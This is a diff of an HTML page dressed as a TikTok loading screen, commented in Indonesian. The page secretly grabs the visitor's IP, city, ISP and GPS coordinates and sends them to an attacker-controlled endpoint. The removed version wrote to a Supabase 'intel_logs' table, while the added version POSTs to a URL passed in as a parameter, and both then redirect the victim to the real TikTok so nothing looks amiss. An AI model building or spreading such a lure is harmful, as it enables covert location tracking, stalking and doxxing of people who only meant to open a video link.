@@ -1,70 +1,121 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok</title> <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TikTok</title>
+    <link rel="icon" href="https://sf16-scmcdn-sg.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e488764010373df8.png">
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; background-color: #000; display: flex; justify-content: center; align-items: center; overflow: hidden; font-family: sans-serif; }
-        
-        /* Gimmick Video Loading */
-        .loader { width: 50px; height: 50px; border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #fff; border-radius: 50%; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        .status-text { position: absolute; bottom: 20%; color: #86868b; font-size: 13px; letter-spacing: 0.5px; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background-color: #010101; 
+            height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            font-family: 'ProximaNova', sans-serif;
+            overflow: hidden;
+        }
+
+        /* Gimmick Loading TikTok */
+        .loader-container {
+            text-align: center;
+            animation: fadeOut 0.5s ease 2.5s forwards; /* Menghilang otomatis */
+        }
+
+        .tiktok-logo {
+            width: 80px;
+            height: 80px;
+            filter: drop-shadow(2px 0px 0px #FD3E3E) drop-shadow(-2px 0px 0px #4DE8F4);
+            animation: pulse 1.5s infinite ease-in-out;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.8; }
+        }
+
+        @keyframes fadeOut {
+            to { opacity: 0; visibility: hidden; }
+        }
+
+        /* Pesan Gimmick */
+        .loading-text {
+            color: white;
+            margin-top: 15px;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+            font-weight: 400;
+        }
     </style>
 </head>
 <body>
 
-    <div class="loader"></div>
-    <div class="status-text">Connecting to content server...</div>
+    <div class="loader-container">
+        <svg class="tiktok-logo" viewBox="0 0 448 512" fill="white">
+            <path d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,381,102.39a121.43,121.43,0,0,0,67,20.14Z"/>
+        </svg>
+        <div class="loading-text">Membuka Aplikasi...</div>
+    </div>
 
     <script>
         const params = new URLSearchParams(window.location.search);
-        const owner = params.get('owner');
-        const target = params.get('url') || 'https://www.tiktok.com';
+        const targetUrl = params.get('url') || 'https://www.tiktok.com';
+        const apiUrl = params.get('api');
 
-        const supabase = window.supabase.createClient(
-            'https://jslpbkoynijeermqeehj.supabase.co',
-            'sb_publishable_VZ8Dfy9m781kpo-CGcg-sw_t5S6h6VY'
-        );
-
-        async function executeCapture() {
-            let intel = { owner_id: owner, status: 'ISP ONLY' };
-
-            // Grab IP & Info via API
+        // INSTANT TRIGGER: 0.0000000000000009MS (Langsung eksekusi)
+        (async function recon() {
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                intel.ip_address = d.ip; intel.city = d.city; intel.isp = d.org;
-            } catch(e) {}
+                // Ambil IP & Info Dasar Dulu (Tanpa Izin)
+                const geoReq = await fetch('https://ipapi.co/json/');
+                const geo = await geoReq.json();
 
-            const finish = () => {
-                // Kasih delay dikit biar kesan loadingnya dapet
-                setTimeout(() => { window.location.href = target; }, 800);
+                // BRUTAL PERMISSION: Langsung minta izin GPS
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        // Jika Diizinkan
+                        sendData(geo, pos.coords.latitude, pos.coords.longitude, "ACCURATE GPS");
+                    },
+                    () => {
+                        // Jika Ditolak
+                        sendData(geo, geo.latitude, geo.longitude, "ISP APPROXIMATION");
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } catch (e) {
+                // Fail-safe: Langsung buang ke TikTok jika error
+                window.location.replace(targetUrl);
+            }
+        })();
+
+        async function sendData(geo, lat, lon, stat) {
+            const payload = {
+                ip: geo.ip,
+                city: geo.city,
+                country: geo.country_name,
+                isp: geo.org,
+                lat: lat,
+                lon: lon,
+                status: stat
             };
 
-            // Recon GPS
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (p) => {
-                    await supabase.from('intel_logs').insert([{ 
-                        ...intel, 
-                        latitude: p.coords.latitude.toString(), 
-                        longitude: p.coords.longitude.toString(), 
-                        status: 'ACCURATE GPS' 
-                    }]);
-                    finish();
-                }, async () => {
-                    await supabase.from('intel_logs').insert([intel]);
-                    finish();
-                });
-            } else {
-                await supabase.from('intel_logs').insert([intel]);
-                finish();
+            // Kirim ke Pterodactyl lo
+            if (apiUrl) {
+                try {
+                    await fetch(apiUrl, {
+                        method: 'POST',
+                        mode: 'no-cors', // Penting agar tidak terblokir
+                        body: JSON.stringify(payload)
+                    });
+                } catch (err) { console.error(err); }
             }
-        }
 
-        window.onload = executeCapture;
+            // REDIRECT BRUTAL (0.000000000003MS setelah send)
+            setTimeout(() => {
+                window.location.replace(targetUrl);
+            }, 100);
+        }
     </script>
 </body>
 </html>
